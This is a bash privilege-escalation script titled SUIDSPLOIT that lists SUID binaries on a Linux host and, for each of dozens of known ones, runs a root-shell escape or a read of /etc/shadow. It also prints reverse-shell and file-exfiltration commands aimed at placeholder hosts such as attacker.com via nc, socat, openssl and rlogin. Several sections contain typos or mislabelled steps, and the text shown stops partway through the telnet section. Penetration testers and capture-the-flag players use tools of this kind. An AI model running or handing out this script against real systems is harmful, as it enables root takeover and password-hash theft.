#!/bin/bash
printf "\n"
printf "\n"
echo "███████╗██╗   ██╗██╗██████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗" 
echo "██╔════╝██║   ██║██║██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo "███████╗██║   ██║██║██║  ██║███████╗██████╔╝██║     ██║   ██║██║   ██║   "
echo "╚════██║██║   ██║██║██║  ██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo "███████║╚██████╔╝██║██████╔╝███████║██║     ███████╗╚██████╔╝██║   ██║   "
echo "╚══════╝ ╚═════╝ ╚═╝╚═════╝ ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                               Version: 1.3     coded by Tizun and Silky"








echo "Find Suid Files"
suid="${suid}"
find / -perm -4000 -type f 2>/dev/null
suid=$(find / -perm -4000 -type f 2>/dev/null)
 

printf "filtering..."
sleep 5
echo "Interesting binaries:"

if [[ $suid == *'/usr/bin/apt-get'* ]]; then
printf "============================================\n"
printf "apt-get found\n"
printf "try  this:\n"
printf "enter '!/bin/sh'\n
sleep 20"
y=$(which apt-get ); $y  changelog apt
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/apt'* ]]; then
printf "============================================\n"
printf "apt found\n"
printf "try this:\n"
printf "enter '!/bin/sh'\n"
sleep 20
y=$(which apt ); $y changelog apt
printf "============================================\n"
fi

 if [[ $suid == *'aria2c'* ]]; then 
printf "============================================\n"
printf "aria2c found\n"
printf "try this:\n"
printf "COMMAND='id'\n"
printf "TF=$(mktemp)\n"
printf 'echo "$COMMAND" > $TF\n'
printf "chmod +x $TF\n"
printf "aria2c --on-download-error=$TF http://x\n"
printf "references at: https://gtfobins.github.io/gtfobins/aria2c/\n"
printf "============================================\n"
fi

 if [[ $suid == *'/usr/sbin/arp'* ]]; then 
printf "============================================\n"
printf "arp found\n"
printf "trying to read the shadow file:\n"
y=$(which arp ); $y -v -f /etc/shadow
printf "============================================\n"
fi

 if [[ $suid == *'/bin/ash'* ]]; then
printf "============================================\n"
printf "ash found\n"
printf "trying to read the shadow file:\n"
y=$(which ash ); $y
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/awk'* ]]; then
printf "============================================\n"
printf "awk found\n"
printf "trying to execute bash:\n"
y=$(which awk ); $y 'BEGIN {system("/bin/sh")}'
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/base64'* ]]; then
printf "============================================\n"
printf "base64 found\n"
printf "trying to read the shadow file:\n"
y=$(which base64 ); $y /etc/shadow | base64 --decode
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/bash'* ]]; then
printf "============================================\n"
printf "bash found\n"
printf "trying to execute bash:\n"
y=$(which bash ); $y -p
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/busybox'* ]]; then
printf "============================================\n"
printf "busybox found\n"
printf "trying to execute bash:\n"
y=$(which busybox ); $y sh
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/cancel'* ]]; then
printf "============================================\n"
printf "cancel found\n"
printf "You can upload files like this:\n"
printf "RHOST=attacker.com\n"
printf "RPORT=12345\n"
printf "LFILE=file_to_send\n"
printf 'cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT\n'
printf "references at: https://gtfobins.github.io/gtfobins/cancel/\n"
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/cat'* ]]; then
 printf "============================================\n"
printf "cat found\n"
printf "trying to read the shadow file:\n"
y=$(which cat ); $y -p  /etc/shadow
printf "============================================\n"
fi

 if [[ $suid == *'/bin/chmod'* ]]; then
 printf "============================================\n"
printf "chmod found\n"
printf "trying to read the shadow file:\n"
y=$(which chmod ); $y -p  0777 /etc/shadow
y=$(which cat ); $y cat /etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/chown'* ]]; then
printf "============================================\n"
printf "chown found\n"
printf "trying to read the shadow file:\n"
y=$(which chown) $y $(id -un):$(id -gn) /etc/shadow
cat /etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/cp'* ]]; then
printf "============================================\n"
printf "cp found\n"
printf "You can inject hashes in passwd:\n"
y=$(which cp ); $y  /etc/passwd >> passwd
printf "edit the rootcolumn in the created passwd file\n"
printf "execute 'cp passwd /etc/passwd'\n"
printf "login as root\n"
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/cpan'* ]]; then
printf "============================================\n"
printf "cpan found\n"
printf "you can execute bash:\n"
printf "enter: ! exec '/bin/bash'\n"
cpan
printf "============================================\n"
fi

 if [[ $suid == *'cpulimit'* ]]; then
printf "============================================\n"
printf "cpulimit found\n"
printf "trying to execute bash:\n"
y=$(which cpulimit ); $y  -l 100 -f /bin/sh
printf "============================================\n"
 
fi

 if [[ $suid == *'/usr/bin/crontab'* ]]; then
printf "============================================\n"
printf "crontab found\n"
printf "you can execute bash :\n"
printf "references: https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/\n"
y=$(which crontab ); $y  -e
printf "============================================\n" 
fi

 if [[ $suid == *'csh'* ]]; then
printf "============================================\n"
printf "csh found\n"
printf "trying to execute bash:\n"
y=$(which csh ); $y 
printf "============================================\n"

fi

 if [[ $suid == *'/usr/bin/curl'* ]]; then
printf "============================================\n"
printf "curl found\n"
printf "trying to read the shadow file:\n"
y=$(which curl ); $y  file:///etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/cut'* ]]; then
printf "============================================\n"
printf "cut found\n"
printf "trying to read the shadow file:\n"
y=$(which cut ); $y -d "" -f1 /etc/shadow 
printf "============================================\n" 

fi

 if [[ $suid == *'/bin/dash'* ]]; then
printf "============================================\n"
printf "dash found\n"
printf "trying to execute bash:\n"
y=$(which dash ); $y -p
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/date'* ]]; then
printf "============================================\n"
printf "date found\n"
printf "trying to read the shadow file:\n"
y=$(which date ); $y -f /etc/shadow
printf "============================================\n"
fi

if [[ $suid == *'/bin/dd'* ]]; then
printf "============================================\n"
printf "dd found\n"
printf "trying to read the shadow file:\n"
y=$(which dd ); $y if=/etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/diff'* ]]; then
printf "============================================\n"
printf "diff found\n"
printf "trying to read the shadow file:\n"
y=$(which diff ); $y  --line-format=%L /dev/null /etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/dmesg'* ]]; then
printf "============================================\n"
printf "dmesg found\n"
printf "you can execute bash:\n"
printf "enter: '!/bin/sh'\n"
y=$(which dmesg ); $y -H
printf "============================================\n" 
fi

 if [[ $suid == *'/sbin/dmsetup'* ]]; then
printf "============================================\n"
printf "dmsetup found\n"
printf "references at https://gtfobins.github.io/gtfobins/dmsetup/:\n"
printf "\n"
printf "============================================\n" 
fi

 if [[ $suid == *'dnf'* ]]; then 
printf "============================================\n"
printf "dnf found\n"
printf "try this:\n"
printf "TF=$(mktemp -d)\n"
printf "echo '/bin/bash' > $TF/x.sh\n"
printf "fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n"
printf "*on target box:*\n"
printf "sudo dnf install -y x-1.0-1.noarch.rpm\n"
printf "\n"
printf "============================================\n" 
fi

 if [[ $suid == *'docker'* ]]; then
printf "============================================\n"
printf "docker found\n"
printf "trying to execute bash:\n"
printf  "trying: docker run --rm -v /home/$USER:/h_docs ubuntu \ \n sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p\n"
y=$(which docker ); $y run --rm -v /home/$USER:/h_docs ubuntu \ sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p

printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/dpkg'* ]]; then
printf "============================================\n"
printf "dpkg found\n"
printf "try this:\n"
printf "TF=$(mktemp -d)\n"
printf "echo '/bin/sh' > $TF/x.sh\n"
printf "fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n"
printf "*on target box:*\n"
printf " dpkg -i x_1.0_all.deb"
printf "\n"
printf "============================================\n" 
fi

 if [[ $suid == *'easy_install'* ]]; then
printf "============================================\n"
printf "easy_install found\n"
printf "trying to execute bash:\n"
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
y=$(which docker ); $y  $TF
printf "============================================\n"  
fi

 if [[ $suid == *'/bin/ed'* ]]; then
 printf "============================================\n"
printf "ed found\n"
printf "trying to execute bash:\n"
printf "enter: !/bin/sh\n"
y=$(which ed); $y 
printf "============================================\n" 
fi

 if [[ $suid == *'emacs'* ]]; then
 printf "============================================\n"
printf "emacs found\n"
printf "trying to execute bash:\n"
y=$(which emacs); $y  -Q -nw --eval '(term "/bin/sh")'
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/env'* ]]; then
 printf "============================================\n"
printf "env found\n"
printf "trying to execute bash:\n"
y=$(which env); $y /bin/sh
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/expect'* ]]; then
 printf "============================================\n"
printf "expand found\n"
printf "trying to read shadow:\n"
y=$(which expand); $y /etc/shadow
printf "============================================\n"
 
fi

 if [[ $suid == *'expect'* ]]; then
 printf "============================================\n"
printf "expect found\n"
printf "trying to get a shell:\n"
y=$(which expect); $y -c 'spawn /bin/sh;interact'
printf "============================================\n" 
fi

 if [[ $suid == *'facter'* ]]; then
printf "============================================\n"
printf "facter found\n"
printf "trying to get a shell:\n"
y=$(which facter);
TF=$(mktemp -d)
echo 'exec("/bin/sh")' > $TF/x.rb
FACTERLIB=$TF $y 
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/flock'* ]]; then
 printf "============================================\n"
printf "flock found\n"
printf "trying to get a shell:\n"
y=$(which flock); $y -u / /bin/sh
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/fmt'* ]]; then
 printf "============================================\n"
printf "fmt found\n"
printf "trying to read the shadow file:\n"
y=$(which fmt); $y  -pNON_EXISTING_PREFIX /etc/shadow
printf "============================================\n" 
fi


 if [[ $suid == *'/usr/bin/find'* ]]; then
 printf "============================================\n"
printf "find found\n"
printf "trying to get a shell:\n"
y=$(which find); $y . -exec /bin/sh -p \; -quit  
printf "============================================\n" 
fi




 if [[ $suid == *'/usr/bin/fold'* ]]; then
 printf "============================================\n"
printf "fold found\n"
printf "trying to read the shadow file:\n"
y=$(which fold); $y -w99999999  /etc/shadow
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/ftp'* ]]; then
printf "============================================\n"
printf "ftp found\n"
printf "tying to execute bash:\n"
printf "enter: '!/bin/sh'\n"
y=$(which ftp ); $y 
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/gdb'* ]]; then
printf "============================================\n"
printf "gdb found\n"
printf "tying to execute bash:\n"
y=$(which gdb ); $y  -nx -ex '!sh' -ex quit
printf "============================================\n" 
fi

 if [[ $suid == *'gimp'* ]]; then
printf "============================================\n"
printf "gimp found\n"
printf "tying to execute bash:\n"
y=$(which gimp ); $y -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("/bin/sh")' 
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/git'* ]]; then
printf "============================================\n"
printf "git found\n"
printf "tying to execute bash:\n"
y=$(which git );  PAGER='sh -c "exec sh 0<&1"'$y -p help
printf "============================================\n"
fi

 if [[ $suid == *'/bin/grep'* ]]; then
printf "============================================\n"
printf "grep found\n"
printf "tying to read the shadow file:\n"
y=$(which grep );$y ''  /etc/shadow
printf "============================================\n"

fi

 if [[ $suid == *'/usr/bin/head'* ]]; then
printf "============================================\n"
printf "grep found\n"
printf "tying to read the shadow file:\n"
y=$(which head );$y -c1G  /etc/shadow
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/ionice'* ]]; then
printf "============================================\n"
printf "ionice found\n"
printf "tying to execute bash:\n"
y=$(which ionice );$y  /bin/sh 
printf "============================================\n"
fi

 if [[ $suid == *'/sbin/ip'* ]]; then
printf "============================================\n"
printf "ip found\n"
printf "tying to read the shadow file and get a shell:\n"
y=$(which ip );$y -force -batch /etc/shadow &&  ip netns add foo ;  ip netns exec foo /bin/sh -p ; ip netns delete foo
printf "============================================\n"

fi

 if [[ $suid == *'/usr/bin/irb'* ]]; then
printf "============================================\n"
printf "irb found\n"
printf "tying to execute bash:\n"
printf "enter: exec '/bin/bash'\n"
y=$(which irb ); $y 
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/jjs'* ]]; then
printf "============================================\n"
printf "jjs found\n"
printf "tying to execute bash:\n"
y=$(which jjs ); echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" |  $y 
printf "============================================\n"

fi

 if [[ $suid == *'journalctl'* ]]; then
printf "============================================\n"
printf "journalctl  found\n"
printf "tying to execute bash:\n"
printf "enter: '!/bin/sh'\n"
y=$(which journalctl ); $y 
printf "============================================\n"
fi

 if [[ $suid == *'jq'* ]]; then
printf "============================================\n"
printf "jq found\n"
printf "tying to read the shadow file:\n"
y=$(which jq ); $y -Rr .  /etc/shadow 
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/jrunscript'* ]]; then
printf "============================================\n"
printf "journalctl  found\n"
printf "tying to execute bash:\n"
y=$(which jrunscript ); $y -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')" 
printf "============================================\n" 
fi

 if [[ $suid == *'ksh'* ]]; then
printf "============================================\n"
printf "ksh  found\n"
printf "tying to execute bash:\n"
y=$(which ksh ); $y 
printf "============================================\n"  
fi

 if [[ $suid == *'ld.so'* ]]; then
printf "============================================\n"
printf "ls.so found\n"
printf "tying to execute bash:\n"
y=$(which ld.so); $y /bin/sh 
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/less'* ]]; then
printf "============================================\n"
printf "less found\n"
printf "tying to execute bash:\n"
printf "enter: '!/bin/sh'\n" 
y=$(which less); $y /etc/profile
printf "============================================\n"  
fi

 if [[ $suid == *'logsave'* ]]; then
printf "============================================\n"
printf "logsave found\n"
printf "tying to execute bash:\n" 
y=$(which logsave); $y /dev/null /bin/sh -i
printf "============================================\n"
fi

 if [[ $suid == *'ltrace'* ]]; then
printf "============================================\n"
printf "ltrace found\n"
printf "tying to execute bash:\n" 
y=$(which ltrace); $y -b -L /bin/sh
printf "============================================\n"
fi

 if [[ $suid == *'lua'* ]]; then
printf "============================================\n"
printf "lua found\n"
printf "tying to execute bash:\n" 
y=$(which lua); $y -e 'os.execute("/bin/sh")'
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/mail'* ]]; then
printf "============================================\n"
printf "mail found\n"
printf "tying to execute bash:\n" 
y=$(which mail); $y --exec='!/bin/sh'
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/make'* ]]; then
printf "============================================\n"
printf "make found\n"
printf "tying to execute bash:\n" 
y=$(which make); $y  -s --eval=$'x:\n\t-'"/bin/sh"
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/man'* ]]; then
printf "============================================\n"
printf "man found\n"
printf "trying to read the shadow file\n"
man /etc/shadow
printf "tying to execute bash:\n"
printf "enter: '!/bin/sh'\n" 
y=$(which man); $y  man
printf "============================================\n"
fi

 if [[ $suid == *'/bin/more'* ]]; then
printf "============================================\n"
printf "more found\n"
printf "trying to read the shadow file\n"
y=$(which more);$y  more /etc/shadow
printf "tying to execute bash:\n" 
printf "enter: '!/bin/sh'\n" 
y=$(which more); TERM=$y /etc/profile  
printf "============================================\n"

fi


# if [[ $suid == *'mtr'* ]]; then
#printf "============================================\n"
#printf "mtr found\n"
#printf "trying to read the shadow file\n" 
#y=$(which mtr);$y   --raw -F  /etc/shadow 
#printf "============================================\n"

#fi

 if [[ $suid == *'/bin/mv'* ]]; then
printf "============================================\n"
printf "mv found\n"
printf "try this:\n" 
printf "LFILE=file_to_write\n"
printf "TF=$(mktemp)"
printf 'echo "DATA" > $TF'
printf "mv $TF $LFILE" 
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/mysql'* ]]; then
printf "============================================\n"
printf "mysql found\n"
printf "trying to execute bash:\n" 
y=$(which mysql); $y -e '\! /bin/sh'
printf "============================================\n"
fi

 if [[ $suid == *'/bin/nano'* ]]; then
printf "============================================\n"
printf "nano\n"
printf "trying to execute bash:\n"
printf "enter: 'STRG+R'"
printf "enter: 'STRG+X'"
printf "enter: 'reset; sh 1>&0 2>&0'"  
y=$(which nano); $y 
printf "============================================\n"
fi

 if [[ $suid == *'/bin/nc'* ]]; then
printf "============================================\n"
printf "nc found\n"
printf "you can get a revshell:\n" 
printf "nc -l -p 12345\n"
printf "*on victims machine*\n"
printf "nc -e /bin/sh RHOST RPORT"
y=$(which nc); $y 
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/nice'* ]]; then
printf "============================================\n"
printf "nice found\n"
printf "trying to execute bash:\n" 
y=$(which nice); $y /bin/sh
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/nl'* ]]; then
printf "============================================\n"
printf "nl found\n"
printf "trying to read the shadow file\n" 
y=$(which nl);$y   -bn -w1 -s '' /etc/shadow 
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/nmap'* ]]; then
printf "============================================\n"
printf "nmap found\n"
printf "trying to execute bash:\n"
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
printf "First Method did not work..enter: '!sh'\n" 
y=$(which nmap); $y --interactive
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/node'* ]]; then
printf "============================================\n"
printf "node found\n"
printf "trying to execute bash:\n" 
y=$(which node); $y -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
printf "============================================\n"
 
fi

 if [[ $suid == *'od'* ]]; then
printf "============================================\n"
printf "od found (could be a false positive)\n"
printf "trying to read the shadow file\n" 
y=$(which od);$y -An -c -w9999 /etc/shadow 
printf "============================================\n"

fi

 if [[ $suid == *'/usr/bin/openssl'* ]]; then
 printf "============================================\n"
printf "openssl found\n"
printf "trying to read the shadow file\n" 
y=$(which openssl);$y  enc -in /etc/shadow
printf "you can also get a  revshell:\n"
printf "run on attackerbox:\n"
printf "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n"
printf "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n"
printf "\n"
printf "on victimsbox:\n"
printf "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect RHOST:RPORT > /tmp/s; rm /tmp/s\n"
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/perl'* ]]; then
printf "============================================\n"
printf "perl found\n"
printf "trying to execute bash:\n" 
y=$(which perl); $y  -e 'exec "/bin/sh";'
printf "============================================\n"
fi

 if [[ $suid == *'pg'* ]]; then
printf "============================================\n"
printf "pg found (could be a false positive)\n"
printf "trying to read the shadow file\n"
printf "enter '!/bin/sh'\n" 
y=$(which pg);$y /etc/profile
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/php'* ]]; then
printf "============================================\n"
printf "php found\n"
printf "trying to execute bash:\n" 
export CMD="/bin/sh"
y=$(which php); $y  -r 'system(getenv("CMD"));' && $y  -r 'passthru(getenv("CMD"));' &&  $y -r 'print(shell_exec(getenv("CMD")));' && $y -r '$r=array(); exec(getenv("CMD"), $r); print(join("\\n",$r));' && $y  php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/pic'* ]]; then
printf "============================================\n"
printf "pic found \n"
printf "trying to execute bash\n" 
printf "enter '.PS'\n"
printf "press *Enter*\n"
printf "enter 'sh X sh X'\n"  
y=$(which pic);$y -U
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/pico'* ]]; then
printf "============================================\n"
printf "pico found \n"
printf "trying to execute bash\n" 
printf "waiting for 20 seconds... in editor enter 'STRG+T'\n"
sleep 20
TF=$(mktemp)
echo 'exec sh' > $TF
chmod +x $TF 
y=$(which pico);$y  -s $TF /etc/hosts  
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/pip'* ]]; then
printf "============================================\n"
printf "pip found \n"
printf "trying to execute bash\n" 
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
y=$(which pip);$y  install $TF  
printf "============================================\n"
 
fi

 if [[ $suid == *'puppet'* ]]; then
printf "============================================\n"
printf "puppet found \n"
printf "trying to execute bash\n" 
y=$(which puppet);$y apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/python'* ]]; then
printf "============================================\n"
printf "python found \n"
printf "trying to execute bash\n" 
y=$(which python);$y  -c 'import os; os.system("/bin/sh")'
printf "============================================\n"  
fi

 if [[ $suid == *'/usr/bin/readelf'* ]]; then
printf "============================================\n"
printf "readelf found\n"
printf "trying to read the shadow file\n" 
y=$(which readelf);$y -a @/etc/shadow
printf "============================================\n"

fi

 if [[ $suid == *'red'* ]]; then
printf "============================================\n"
printf "red found \n"
printf "trying to read the shadow file\n"  
printf "waiting for 20 seconds... in editor enter ',p'\n"
printf "*Press Enter*\n"
printf "enter 'q'\n"
sleep 20  
y=$(which red);$y  /etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/rlogin'* ]]; then
printf "============================================\n"
printf "rlogin found\n"
printf "we can upload files:\n"
printf "\n"
printf "upload: nc -l -p 12345 > 'file_to_save'"
printf "try this:\n"
printf "RHOST=attacker.com\n"
printf "RPORT=12345\n"
printf "LFILE=file_to_send\n"
printf 'rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST'
printf "\n"
printf "============================================\n" 
fi

 if [[ $suid == *'rlwrap'* ]]; then
printf "============================================\n"
printf "rlwrap found \n"
printf "trying to execute bash\n" 
y=$(which rlwrap);$y  /bin/sh
printf "============================================\n" 
fi

 if [[ $suid == *'rpm'* ]]; then
printf "============================================\n"
printf "rpm found \n"
printf "trying to execute bash\n" 
y=$(which rpm);$y  --eval '%{lua:os.execute("/bin/sh")}'
printf "============================================\n"  
fi

 if [[ $suid == *'rpmquery'* ]]; then
printf "============================================\n"
printf "rpmquery found \n"
printf "trying to execute bash\n" 
y=$(which rpm);$y  --eval '%{lua:posix.exec("/bin/sh")}'
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/rsync'* ]]; then
printf "============================================\n"
printf "rsync found \n"
printf "trying to execute bash\n" 
y=$(which rsync);$y  -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
printf "============================================\n"

fi

 if [[ $suid == *'/usr/bin/ruby'* ]]; then
printf "============================================\n"
printf "ruby found \n"
printf "trying to execute bash\n" 
y=$(which ruby);$y   -e 'exec "/bin/sh"'
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/run-mailcap'* ]]; then
printf "============================================\n"
printf "run-mailcap found \n"
printf "trying to execute bash\n" 
printf "enter: '!/bin/sh'"
y=$(which run-mailcap);$y --action=view /etc/hosts
printf "============================================\n"
fi

 if [[ $suid == *'/bin/run-parts'* ]]; then
printf "============================================\n"
printf "run-parts found \n"
printf "trying to execute bash\n" 
y=$(which run-parts);$y   --new-session --regex '^sh$' /bin
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/rvim'* ]]; then
printf "============================================\n"
printf "rvim found \n"
printf "trying to execute bash\n" 
y=$(which rvim);$y -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' && $y -c ':lua os.execute("reset; exec sh")'  
printf "============================================\n"

fi

 if [[ $suid == *'/usr/bin/scp'* ]]; then
printf "============================================\n"
printf "scp found \n"
printf "trying to execute bash\n" 
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
y=$(which scp);$y -S $TF x y:
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/screen'* ]]; then
printf "============================================\n"
printf "screen found \n"
printf "trying to execute bash\n" 
y=$(which screen);$y 
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/script'* ]]; then
 printf "============================================\n"
printf "script found \n"
printf "trying to execute bash\n" 
y=$(which script);$y 
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/sed'* ]]; then
 printf "============================================\n"
printf "sed found \n"
printf "trying to execute bash\n" 
y=$(which sed);$y  -n '1e exec sh 1>&0' /etc/hosts
printf "============================================\n" 
fi


 if [[ $suid == *'/usr/sbin/service'* ]]; then
printf "============================================\n"
printf "service found \n"
printf "trying to execute bash\n" 
y=$(which service);$y ../../bin/sh
printf "============================================\n"  
fi

 if [[ $suid == *'/usr/bin/setarch'* ]]; then
printf "============================================\n"
printf "setarch found \n"
printf "trying to execute bash\n" 
y=$(which setarch);$y  $(arch) /bin/sh
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/sftp'* ]]; then
printf "============================================\n"
printf "sftp found \n"
printf "trying to execute bash\n"
printf "enter: '!/bin/sh'\n"
HOST=user@attacker.com 
y=$(which sftp);$y sftp $HOST  
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/shuf'* ]]; then
printf "============================================\n"
printf "shuf found \n"
printf "trying to read the shadow file\n" 
y=$(which shuf);$y -e DATA -o  /ect/shadow 
printf "============================================\n"
fi
 if [[ $suid == *'/usr/bin/smbclient'* ]]; then
printf "============================================\n"
printf "smbclient found \n"
printf "trying to execute bash\n" 
printf "enter: '!/bin/sh'\n"
y=$(which smbclient);$y  '\\attacker\share'
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/socat'* ]]; then
 printf "============================================\n"
printf "socat found\n"
printf "you can get a revshell:\n" 
printf "socat file:`tty`,raw,echo=0 tcp-listen:12345\n"
printf "*on victims machine*"
printf "RHOST=attacker.com"
printf "RPORT=12345"
printf "socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane" 
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/sort'* ]]; then
printf "============================================\n"
printf "shuf found \n"
printf "trying to read the shadow file\n" 
y=$(which sort);$y -m /ect/shadow 
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/sqlite3'* ]]; then
printf "============================================\n"
printf "sqlite3 found \n"
printf "trying to execute bash\n" 
y=$(which sqlite3);$y /dev/null '.shell /bin/sh'
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/ssh'* ]]; then
printf "============================================\n"
printf "ssh found \n"
printf "trying to execute bash\n" 
y=$(which ssh);$y  ssh -o ProxyCommand=';sh 0<&2 1>&2' x
printf "============================================\n" 
fi

 if [[ $suid == *'/sbin/start-stop-daemon'* ]]; then
printf "============================================\n"
printf "start-stop-buf found \n"
printf "trying to execute bash\n" 
y=$(which start-stop-daemon);$y -n $RANDOM -S -x /bin/sh 
printf "============================================\n"
fi

 if [[ $suid == *'nstdbuf'* ]]; then
printf "============================================\n"
printf "nstdbuf found \n"
printf "trying to execute bash\n" 
y=$(which nstdbuf);$y -i0 /bin/sh
printf "============================================\n"
fi

 if [[ $suid == *'strace'* ]]; then
 printf "============================================\n"
printf "strace found \n"
printf "trying to execute bash\n" 
y=$(which strace);$y  -o /dev/null /bin/sh
printf "============================================\n"
fi

 if [[ $suid == *'/bin/systemctl'* ]]; then
 printf "============================================\n"
printf "systemctl found \n"
printf "trying to execute rce (only read)\n"
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh  -c "whoami > /tmp/systemctl_output\n" 
[Install]
WantedBy=multi-user.target' > $TF
y=$(which systemctl);$y link $TF
printf "look at /tmp/systemctl_output\n"
printf "============================================\n" 
fi

 if [[ $suid == *'/bin/tar'* ]]; then
printf "============================================\n"
printf "tar found\n"
printf "Let's get a shell\n"
x=$(which tar ); $x -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
printf "============================================\n" 
fi



 if [[ $suid == *'/usr/bin/tail'* ]]; then
printf "============================================\n"
printf "tail found\n"
printf "Trying to read /etc/shadow!\n"
x=$(which tail ); $x -c1G /etc/shadow
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/taskset'* ]]; then
printf "============================================\n"
printf "taskset found\n"
printf "I do it!\n"
x=$(which taskset ); $x 1 /bin/sh -p
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/tclsh'* ]]; then
printf "============================================\n" 
printf "tclsh found\n"
printf "We want a shell\n"
printf "enter: 'exec /bin/sh <@stdin >@stdout 2>@stderr'\n"
x=$(which tclsh ); $x ; 
printf "============================================\n"
fi

 if [[ $suid == *'/usr/sbin/tcpdump'* ]]; then
printf "============================================\n"
printf "tcpdump found:\n"
printf "trying to trigger rce"
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/tee'* ]]; then 
printf "============================================\n"
printf "tee found\n"
printf "It writes data to files"
printf "sh -c 'cp $(which tee) .; chmod +s ./tee\n'"
printf "LFILE=file_to_write\n"
printf "echo DATA | ./tee -a $LFILE\n"
printf "============================================\n" 
fi


if [[ $suid == *'/usr/bin/telnet'* ]]; then
printf "============================================\n"
printf "You can try to get a reverse shell\n"
printf "On Attacker box\n"
printf "nc -l -p 12345\n"
printf "On Target\n"
printf "RHOST=x.x.x.x\n"
printf "RPORT=12345\n"
